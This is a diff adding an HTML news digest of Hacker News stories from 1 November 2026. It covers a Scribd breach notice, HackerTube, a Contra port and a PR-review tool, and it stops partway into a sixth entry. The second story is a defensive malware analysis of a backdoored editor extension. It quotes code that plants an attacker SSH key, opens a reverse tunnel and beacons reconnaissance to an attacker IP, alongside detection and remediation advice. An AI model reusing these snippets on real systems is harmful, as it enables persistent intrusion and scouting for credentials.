@@ -1,0 +1,616 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HN Intelligence 2026-11-01 AM</title>
+
+<style>
+html {
+    margin: 0 !important;
+    padding: 0 !important;
+    border: 0 !important;
+}
+
+body {
+    margin: 0 !important;
+    padding: 0 !important;
+    border: 0 !important;
+
+    font-family:
+        Georgia,
+        "Noto Serif",
+        serif;
+
+    font-size: 1em;
+    line-height: 1.42;
+
+    orphans: 1 !important;
+    widows: 1 !important;
+}
+
+/*
+KOReader / CREngine 可能對標題或區塊套用
+內建分頁規則。
+
+這裡全面取消文件自己的前後換頁要求。
+*/
+* {
+    break-before: auto !important;
+    page-break-before: auto !important;
+
+    break-after: auto !important;
+    page-break-after: auto !important;
+}
+
+/*
+尤其確保第一個元素絕不要求換頁。
+*/
+body > :first-child {
+    margin-top: 0 !important;
+    padding-top: 0 !important;
+
+    break-before: auto !important;
+    page-break-before: auto !important;
+}
+
+/*
+不使用 break-inside: avoid。
+讓 CREngine 自己自然分頁，
+避免大型區塊被整個推到下一頁。
+*/
+.issue-head,
+.story,
+.story-title,
+.article-body,
+.para {
+    break-inside: auto !important;
+    page-break-inside: auto !important;
+}
+
+.issue-head {
+    margin:
+        0
+        0.55em
+        0.55em
+        0.55em;
+
+    padding:
+        0.18em
+        0
+        0.48em
+        0;
+
+    border-bottom:
+        1px solid #777;
+}
+
+.issue-title {
+    margin: 0;
+    padding: 0;
+
+    font-size: 1.42em;
+    line-height: 1.15;
+    font-weight: bold;
+}
+
+.issue-sub {
+    margin-top: 0.18em;
+
+    font-size: 0.82em;
+    line-height: 1.28;
+}
+
+.story {
+    margin:
+        0
+        0.55em
+        0
+        0.55em;
+
+    padding:
+        0.62em
+        0
+        0.78em
+        0;
+
+    border-top:
+        1px solid #aaa;
+}
+
+.story:first-of-type {
+    border-top: 0;
+    padding-top: 0.28em;
+}
+
+.story-title {
+    margin: 0;
+    padding: 0;
+
+    font-size: 1.24em;
+    line-height: 1.25;
+    font-weight: bold;
+}
+
+.number {
+    font-weight: normal;
+}
+
+.badge {
+    display: inline-block;
+
+    margin:
+        0.35em
+        0
+        0.15em
+        0;
+
+    padding:
+        0.08em
+        0.30em;
+
+    border:
+        1px solid #777;
+
+    font-size: 0.72em;
+    font-weight: bold;
+    line-height: 1.2;
+}
+
+.meta {
+    margin-top: 0.12em;
+
+    font-size: 0.78em;
+    line-height: 1.28;
+}
+
+.ranks {
+    font-style: italic;
+}
+
+.links {
+    margin:
+        0.28em
+        0
+        0.48em
+        0;
+
+    font-size: 0.82em;
+    line-height: 1.3;
+}
+
+.links a {
+    text-decoration: underline;
+}
+
+.body-label {
+    margin:
+        0.48em
+        0
+        0.30em
+        0;
+
+    font-size: 0.86em;
+    font-weight: bold;
+}
+
+.article-body {
+    margin: 0;
+    padding: 0;
+}
+
+.para {
+    margin:
+        0
+        0
+        0.72em
+        0;
+
+    padding: 0;
+
+    line-height: 1.45;
+}
+
+.reference-note {
+    margin:
+        0.45em
+        0
+        0.35em
+        0;
+
+    padding:
+        0.35em
+        0;
+
+    font-size: 0.88em;
+    font-style: italic;
+    line-height: 1.38;
+}
+
+@media screen and (min-width: 48em) {
+    body {
+        max-width: 48em;
+        margin-left: auto !important;
+        margin-right: auto !important;
+    }
+}
+</style>
+</head>
+<body><div class="issue-head"><div class="issue-title">HN Intelligence</div><div class="issue-sub">2026-11-01 AM · Generated 2026-11-01 08:16 CST</div><div class="issue-sub">Stories 10 · Full 6</div><div class="issue-sub">Sources: atlasum.net, bbrouter.com, bobby.viraj.computer, epoyraz.github.io, karpathy.bearblog.dev, news.ycombinator.com, phorion.io, science.org, smithsonianmag.com</div></div>
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">1.</span>
+    Tell HN: Scribd Breached
+  </div>
+
+  <div class="badge hn-text">
+    HN TEXT
+  </div>
+
+  <div class="meta">
+    335 points ·
+    120 comments ·
+    x______________
+  </div>
+
+  <div class="meta">
+    news.ycombinator.com
+  </div>
+
+  <div class="meta ranks">
+    Ask HN #1 · Best #15 · Top #51
+  </div>
+
+  <div class="links">
+    <a href="https://news.ycombinator.com/item?id=50312756">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">Not seeing anything posted about this anywhere, received on Monday, 26th of Oct 2026:<br>Subject: Notice of Security Incident<br>This notice is being sent on behalf of Scribd, Inc., the parent company of Scribd, Slideshare, Everand, and Fable, by Epiq, Scribd Inc.’s notification partner.<br>Hello,<br>We are writing to let you know that Scribd, Inc. recently experienced a security incident that may have affected your data.<br>We detected that an unauthorized third party may have gained access to certain user data in one of our systems. After investigating this activity, we found that the third party may have accessed your email address and the following of your information: last 4 digits of your credit card and country, credit card issuer, credit card expiry date, payment history (not including credit card details).<br>We have no evidence that this data has been misused, but we are notifying you out of an abundance of caution so that you can take steps to protect your information.<br>Watch for phishing<br>We encourage you to stay vigilant for phishing attempts by bad actors pretending to be Scribd, Inc. or Scribd, Slideshare, Everand or Fable.<br>Remember that Scribd, Inc. will never ask you for your username and password or other sensitive information via email or text. If you did receive a message like that:</div>
+<div class="para">Don&#x27;t click on any links in it. Instead type scribd.com, slideshare.net, everand.com, or fable.co directly into your browser.<br>Call us at: +1-877-361-9887. Hours of operation are Monday-Friday, 11:00 a.m.-11:00 p.m., Central European Time.<br>Report it through Scribd, Inc.&#x27;s Help Center.</div>
+<div class="para">For more information<br>We regret that this incident occurred and any concern it may cause you. If you have additional questions, contact the dedicated call center at +1-877-361-9887. Hours of operation are Monday-Friday, 11:00 a.m.-11:00 p.m. Central European Time.<br>The National Cyber Security Center has helpful guidance on how to recognize and avoid phishing scams here.<br>What Scribd, Inc. is doing</div>
+<div class="para">We have secured the affected system and ended the unauthorized access.<br>We have notified law enforcement as well as the relevant data protection authorities.<br>We are working with an expert third party cybersecurity firm to strengthen our access controls and monitoring.</div>
+<div class="para">We value the trust you place in us with your information, and don’t take that lightly. We are deeply sorry this happened and will keep you updated if anything further changes.<br>Scribd, Inc.</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">2.</span>
+    Backdoor in Claude Code for VS Code extension on the Cursor Marketplace
+  </div>
+
+  <div class="badge full-text">
+    FULL TEXT
+  </div>
+
+  <div class="meta">
+    967 points ·
+    547 comments ·
+    _chall
+  </div>
+
+  <div class="meta">
+    phorion.io
+  </div>
+
+  <div class="meta ranks">
+    Best #1 · Top #45
+  </div>
+
+  <div class="links">
+    <a href="https://phorion.io/blog/offical-claude-code-vsx-compromise/">Original article</a> · <a href="https://news.ycombinator.com/item?id=50300683">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">TL;DR<br>Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.<br>Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered.<br>Revision history<br>- Initial publication<br>- Marketplace correction<br>Corrected the affected marketplace to Cursor.<br>- Version-scope update<br>Added2.1.312 per Cursor’s updated notice.<br>Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313, from its marketplace.<br>While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.<br>The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.<br>Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.<br>In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.<br>Infection Chain<br>The Cursor Marketplace Extension<br>The compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.<br>The injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.<br>Stage 1 - Preparing SSH Access<br>First, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.<br>The key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.<br>var sd = path.join(HOME, &quot;.ssh&quot;),<br>ak = path.join(sd, &quot;authorized_keys&quot;);<br>// ...<br>if (cur.indexOf(&quot;svc-telemetry&quot;) &lt; 0) {<br>fs.appendFileSync(ak, PUB + &quot;\n&quot;);<br>d.sshKey = &quot;added&quot;<br>} else {<br>d.sshKey = &quot;present&quot;<br>}<br>Here, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).<br>With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:<br>- Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.<br>- macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.<br>- Windows: tries to install and start OpenSSH Server using PowerShell.<br>None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.<br>It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.<br>A bug in the macOS SSH logic?<br>On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tries to enable Remote Login if the output contains Off:<br>// ...<br>else if (PLAT === &quot;darwin&quot;) {<br>var rl = ex(&quot;systemsetup -getremotelogin 2&gt;/dev/null&quot;, 4000);<br>d.remoteLogin = rl;<br>if (/Off/i.test(rl)) {<br>det(&quot;sudo -n systemsetup -setremotelogin on &gt;/dev/null 2&gt;&amp;1&quot;);<br>d.remoteLoginOn = &quot;tried&quot;<br>}<br>}<br>Notice that the second command (-setremotelogin on) uses sudo -n, while the first command (-getremotelogin) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead:<br>You need administrator access to run this tool... exiting!<br>systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0. The malware’s ex() helper grabs stdout and returns it:<br>function ex(c, t) {<br>try {<br>return cp.execSync(c, {<br>timeout: t || 3000,<br>stdio: [&quot;ignore&quot;, &quot;pipe&quot;, &quot;ignore&quot;],<br>windowsHide: true<br>}).toString().trim()<br>} catch (e) {<br>return &quot;&quot;<br>}<br>}<br>Because the output is &quot;You need administrator access to run this tool... exiting!&quot;, /Off/i.test(rl) evaluates to false.<br>As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.<br>This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.<br>Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.<br>Stage 2 - Establishing the Reverse SSH Tunnel<br>Next, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun.<br>It’s worth keeping the two keys straight during an investigation:<br>- The public key added to ~/.ssh/authorized_keys (svc-telemetry) lets the attacker log into the victim’s machine.<br>- The embedded private key (svc-telemetry-tun) lets the victim’s machine connect out to the attacker’s tunnel server.<br>The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_, followed by the first ten characters of the MD5 hash of the hostname and home directory path:<br>var kf = path.join(<br>TMP,<br>&quot;.stk_&quot; + crypto.createHash(&quot;md5&quot;)<br>.update(String(os.hostname()) + HOME).digest(&quot;hex&quot;).slice(0, 10)<br>);<br>// ...<br>var RF = (PLAT === &quot;win32&quot;) ? &quot;\&quot;*:0:localhost:22\&quot;&quot; : &quot;&#x27;*:0:localhost:22&#x27;&quot;;<br>The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine:<br>Affected host -- outbound SSH tunnel --&gt; External SSH server<br>Operator -- separate connection --&gt; Server&#x27;s allocated port<br>|<br>Through the existing tunnel<br>|<br>v<br>Affected host&#x27;s SSH:22<br>|<br>Login using the planted key<br>Because the tunnel runs with -N, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.<br>The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds (ServerAliveCountMax=3), and ExitOnForwardFailure is turned on.<br>If autossh is installed, the script uses it; otherwise it falls back to standard ssh. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.<br>Stage 3 - Keeping Access Available<br>To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:<br>| Platform | Artifacts | Persistence mechanism | Notes |<br>|---|---|---|---|<br>| Linux | ~/.config/.smt, ~/.config/.smtk | Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab. | Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below). |<br>| macOS | ~/.config/.smt, ~/.config/.smtk, ~/Library/LaunchAgents/com.apple.sysmond.plist | Writes a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true, then loads it via launchctl. | Runs in the user context rather than as a root LaunchDaemon. |<br>| Windows | ~/.config/smt.cmd, ~/.config/smtk, %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd | Tries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder. | Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login. |<br>On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop.<br>On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/:<br>&lt;key&gt;Label&lt;/key&gt;<br>&lt;string&gt;com.apple.sysmond&lt;/string&gt;<br>&lt;!-- ... --&gt;<br>&lt;key&gt;RunAtLoad&lt;/key&gt;<br>&lt;true/&gt;<br>&lt;key&gt;KeepAlive&lt;/key&gt;<br>&lt;true/&gt;<br>Stage 4 - Host Recon<br>Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:<br>- Hostname, username, OS platform, and architecture<br>- Home directory, current working directory, and global Git email (git config --global user.email)<br>- Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)<br>- Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/i<br>The environment variable check uses Object.keys(process.env):<br>Object.keys(process.env)<br>.filter(function(k) {<br>return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k)<br>})<br>.slice(0, 40)<br>Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.<br>To get the machine’s public IP, the script queries ifconfig[.]me, falling back to api[.]ipify[.]org.<br>It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099:<br>var r = http.request({<br>host: h,<br>port: p,<br>path: &quot;/beacon&quot;,<br>method: &quot;POST&quot;,<br>timeout: 3000,<br>headers: {&quot;content-type&quot;: &quot;application/json&quot;}<br>}, function(res) {<br>res.resume()<br>});<br>// ...<br>r.write(JSON.stringify(d));<br>r.end()<br>Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.<br>The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume(). It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.<br>Detection Opportunities<br>From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.<br>SSH Key and Configuration Changes<br>Because the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync, process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (Code Helper, Cursor Helper, etc.) creating or writing to ~/.ssh/authorized_keys.<br>Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.<br>While you should also monitor for systemsetup -setremotelogin on, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.<br>User LaunchAgent Persistence<br>The persistence setup on macOS gives us a couple of strong signals:<br>- A non-Apple process writing a plist with a com.apple.* label (~/Library/LaunchAgents/com.apple.sysmond.plist).<br>- A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory (~/.config/.smt).<br>Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together.<br>SSH Tunnels and Follow-On Access<br>On the process and network side, look for:<br>- ssh or autossh launched with remote port forwarding (-R *:0:localhost:22) and identity files pulled from /tmp/.stk_* or ~/.config/.smtk.<br>- Outbound SSH connections to 134.209.82[.]225 on port 22, alongside HTTP POST requests to 134.209.82[.]225:8099 (and connection attempts to 127.0.0.1:8099).<br>If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from localhost (127.0.0.1 or ::1) authenticating with the svc-telemetry key.<br>Remediation<br>If you identify an affected machine, uninstalling the extension alone won’t remove the backdoor. Make sure your response covers all of the stages it drops:<br>- Kill active tunnel processes: Terminate the /bin/sh retry loop and any ssh or autossh processes connecting to 134.209.82[.]225.<br>- Remove persistence: Unload and delete ~/Library/LaunchAgents/com.apple.sysmond.plist on macOS (or clean up the @reboot cron entry on Linux / SysMon scheduled task and Startup script on Windows), and remove ~/.config/.smt and ~/.config/.smtk.<br>- Clean up SSH keys and state: Remove the svc-telemetry public key from ~/.ssh/authorized_keys, delete /tmp/.stk_*, and verify that Remote Login (SSH) hasn’t been enabled unexpectedly.<br>- Rotate credentials: If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the KEY|TOKEN|SECRET|PASS|AWS|GCP environment variable filter).<br>Phorion’s Approach<br>Phorion’s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creating com.apple.* LaunchAgents and LaunchAgents executing shell scripts from hidden directories.<br>Beyond persistence, Phorion’s file access telemetry captures the IDE extension host modifying ~/.ssh/authorized_keys directly, and Phorion Protections can be used to lock down ~/.ssh/ so that only authorised processes can read or modify SSH keys and configuration files in the first place.<br>If you want to see how Phorion detects and blocks supply chain threats like this across your Mac fleet, get in touch to arrange a demo.<br>Indicators<br>Sample and Public-Key Fingerprints<br>| Indicator | Value | Notes |<br>|---|---|---|<br>| SHA-256 | ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15 | Backdoored extension.js bundle |<br>| Victim-login public-key fingerprint | SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk | Ed25519 key appended to ~/.ssh/authorized_keys (comment svc-telemetry) |<br>| Tunnel public-key fingerprint | SHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQ | Embedded Ed25519 key used to authenticate to the tunnel server (comment svc-telemetry-tun) |<br>Network Indicators<br>| Indicator | Type | Notes |<br>|---|---|---|<br>| 134.209.82[.]225 (TCP 22, user tunnel) | IP / SSH | Outbound reverse SSH tunnel server |<br>| 134.209.82[.]225:8099 (POST /beacon) | IP / HTTP | External host-report beacon endpoint |<br>| 127.0.0.1:8099 (POST /beacon) | Loopback / HTTP | Local beacon destination |<br>| ifconfig[.]me, api[.]ipify[.]org | Domain | Legitimate services queried for public IP discovery |<br>Host Artifacts<br>| Artifact | Platform | Notes |<br>|---|---|---|<br>| ~/.&lt;ide&gt;/extensions/anthropic.claude-code-2.1.312-darwin-arm64 | macOS (Apple Silicon) | Additional affected version identified in Cursor’s security notice ( &lt;ide&gt; varies by editor) |<br>| ~/.&lt;ide&gt;/extensions/anthropic.claude-code-2.1.313-darwin-arm64 | macOS (Apple Silicon) | Installed extension directory ( &lt;ide&gt; varies by editor) |<br>| ~/.ssh/authorized_keys (comment svc-telemetry) | All | Planted Ed25519 public key |<br>| &lt;TMP&gt;/.stk_&lt;10 hex chars&gt; ($TMPDIR/.stk_* on macOS) | All | Initial tunnel private key in the OS temporary directory (suffix is first 10 hex chars of MD5(hostname + HOME)) |<br>| ~/.config/.smt and ~/.config/.smtk | macOS, Linux | Persistence shell script and recreated tunnel private key |<br>| ~/Library/LaunchAgents/com.apple.sysmond.plist | macOS | User LaunchAgent executing /bin/sh ~/.config/.smt |<br>| @reboot cron entry for ~/.config/.smt | Linux | User crontab persistence |<br>| ~/.config/smt.cmd and ~/.config/smtk | Windows | Persistence batch script and tunnel private key |<br>| Scheduled task SysMon | Windows | Startup scheduled task (requests SYSTEM) |<br>| %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd | Windows | Startup folder fallback script |</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">3.</span>
+    HackerTube: YouTube built from videos recommended by HN
+  </div>
+
+  <div class="badge full-text">
+    FULL TEXT
+  </div>
+
+  <div class="meta">
+    563 points ·
+    207 comments ·
+    karpathy
+  </div>
+
+  <div class="meta">
+    karpathy.bearblog.dev
+  </div>
+
+  <div class="meta ranks">
+    Top #1 · Best #7
+  </div>
+
+  <div class="links">
+    <a href="https://karpathy.bearblog.dev/hacker-tube/">Original article</a> · <a href="https://news.ycombinator.com/item?id=50319510">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">HackerTube<br>It was Friday night at 11pm, I was tired, I went to YouTube to watch something and realized that I was looking at an enshittified wall of slop. Insanely exaggerated thumbnails, dumb recommendations of the same tired topics, truly terrible idiocracy-grade content. I&#x27;m sure this algorithm works well for the median person on the internet, but it definitely does not work for me. So this morning (Saturday) I took a hold of my Opus 5.5 and gave it the task: Let&#x27;s write our own YouTube clone based on whatever videos have been recommended on Hacker News. And Opus came back with: hackertube.org!<br>Opus downloaded all comments of HackerNews, filtered them down, ran Sonnet over them in a workflow, got rid of spam and low grade content, and narrowed them down to just 40K comments recommending a YouTube video. In total, we get 6,454 YouTube videos that have been recommended by a few people on HN from 2007-2026 across 150 topics. Then we wrap it up in a YouTube UI, get a domain, push to a VPS, secure, harden, optimize and voila!<br>HackerTube:<br>- Contains quality content<br>- Uses the 50% thumbnail instead of the uploaded thumbnail<br>- Custom and good ForYou recommendations without any user accounts, storing state in local browser session<br>- Keyboard shortcuts<br>- Export of the site&#x27;s data available to give to your agent to easily create your own version<br>This takes ~2 hours now. I can breathe again. Thank you Opus 5.5 &lt;3.</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">4.</span>
+    Show HN: NES Contra (1987) port (ASM –&gt; C and then C –&gt; WebAssembly)
+  </div>
+
+  <div class="badge hn-text">
+    HN TEXT
+  </div>
+
+  <div class="meta">
+    38 points ·
+    26 comments ·
+    tevlon
+  </div>
+
+  <div class="meta">
+    epoyraz.github.io
+  </div>
+
+  <div class="meta ranks">
+    Show HN #1 · Top #13
+  </div>
+
+  <div class="links">
+    <a href="https://epoyraz.github.io/nes-contra-us/">Original article</a> · <a href="https://news.ycombinator.com/item?id=50319169">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">Based on vermiceli&#x27;s annotated disassembly of Contra: https://github.com/vermiceli/nes-contra-us. Thanks for the great work.<br>I ported it in two steps. First to C: the game logic is translated routine by routine from the 6502 assembly, and checked frame by frame against the original in the Mesen emulator. Then the C code to WebAssembly so it runs in the browser.<br>The cherry on top: online multiplayer, so two players can play co-op over the internet.<br>Source: https://github.com/epoyraz/nes-contra-us</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">5.</span>
+    Show HN: Bobby – Over Engineering PR Reviews
+  </div>
+
+  <div class="badge full-text">
+    FULL TEXT
+  </div>
+
+  <div class="meta">
+    1 points ·
+    0 comments ·
+    angrybayblade
+  </div>
+
+  <div class="meta">
+    bobby.viraj.computer
+  </div>
+
+  <div class="meta ranks">
+    New #1
+  </div>
+
+  <div class="links">
+    <a href="https://bobby.viraj.computer/">Original article</a> · <a href="https://news.ycombinator.com/item?id=50321554">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">Ten files, A to Z, and five threads. Where would you start?<br>Scroll, and Bobby takes it over, one piece at a time. Same PR, same threads, same review at the end.<br>01 · Navigation<br>Know where you are.<br>OutFour rows of repo and PR navigation.<br>InOne bar: where you are in the PR, how far you&#x27;ve got, and the view you&#x27;re reading in.<br>02 · Files<br>The files that matter, placed.<br>OutThe file tree, A to Z.<br>InEach file tagged by where it sits: L-1 what the change relies on, L0 the change, L1 what it affects. Tests and generated files stay hidden until you ask.<br>03 · Diff view<br>From a list to a map.<br>OutEvery diff, stacked top to bottom.<br>InBobby&#x27;s Diff view lays the same diffs out on one canvas, each file right of the files it relies on, so you see the shape of the change before you read a line.<br>04 · Diff view<br>The diff you know, in order.<br>OutThe whole map at once.<br>InStep in and one file fills the view: the same diff and threads as GitHub. jk follow the map, from what a change relies on to what it affects.<br>05 · Inspect<br>What is this?<br>OutA new tab, to find where it&#x27;s declared.<br>In⌘-click a name: its declaration opens over the diff, the whole of it, and esc puts you back where you were.<br>06 · Inspect<br>Who else calls it?<br>OutSearching the repo for its callers.<br>In⌘⇧-click: every use, in the diff, in the PR&#x27;s files and elsewhere. Open one to read it in place, or go to it in the diff. One caller the PR never touched still passes no key.<br>07 · Lens view<br>One change. One question.<br>OutThe whole diff at once.<br>InThe Lens view splits the PR into cores, one idea each, and opens each with a question to keep in mind. With Claude Code installed, Claude names the cores and writes the questions.<br>08 · Context<br>What it relies on. What it affects.<br>OutSearching the repo for who calls it.<br>InThe code around the change, and how each piece connects, including code the PR never touched. That&#x27;s where bugs hide.<br>09 · Comments<br>Comments where they belong.<br>OutA count of conversations, somewhere below.<br>InEvery GitHub thread under its line. Your comments wait as drafts; private notes never leave your machine.<br>10 · Progress<br>Walk it, mark it, move on.<br>Out&quot;Viewed&quot; checkboxes, file by file.<br>Injk walk the PR in order; a marks a page looked at and moves on. Marks follow the code, so after a force-push only what changed comes back.<br>11 · Interruptions<br>Park the thought.<br>OutLosing your place to a ping.<br>Inp parks what&#x27;s in your head before you switch away. It waits for you in the bar.<br>12 · Coming back<br>Pick up where you left off.<br>OutScrolling around for where you were.<br>InWhere you were, how far you got, and the thought you parked. Progress survives restarts and force-pushes.<br>13 · Ask Claude<br>Ask about any lines.<br>OutPinging the author: &quot;who else calls this?&quot;<br>InSelect some lines, press q, and ask. Claude checks the code around them, and answers right there, on those lines. Ask a follow-up, or start a comment from the answer.<br>14 · Ask Claude<br>Every claim, one click away.<br>OutTaking an answer on trust.<br>InEach reference Claude makes is checked against the code and opens it: the lines it means, and what the PR changed in them, highlighted.<br>15 · Review with Claude<br>A second pair of eyes, when you ask.<br>OutHoping you caught everything.<br>InTell Claude what to look for, and which of your tools it may read: the ticket in Linear, the doc in Notion, the thread in Slack. It reads the PR file by file, the way you would.<br>16 · Review with Claude<br>One finding at a time.<br>OutA wall of AI comments to wade through.<br>InThe worst first, each with its code. a adds it to your review, e edits it first, d dismisses it. Nothing is posted unless you add it and submit.<br>17 · Submit<br>One review, one key.<br>Out&quot;Review changes&quot;, at the end of a long page.<br>Ins posts every draft as one GitHub review: comment, approve or request changes. Private notes stay on your machine.<br>18 · Conversation view<br>Approved, on GitHub.<br>OutSwitching to the browser to check it landed.<br>InThe Conversation view is GitHub&#x27;s own timeline, read live: your approval is already in it, LGTM! and all, next to everyone else&#x27;s.</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">6.</span>
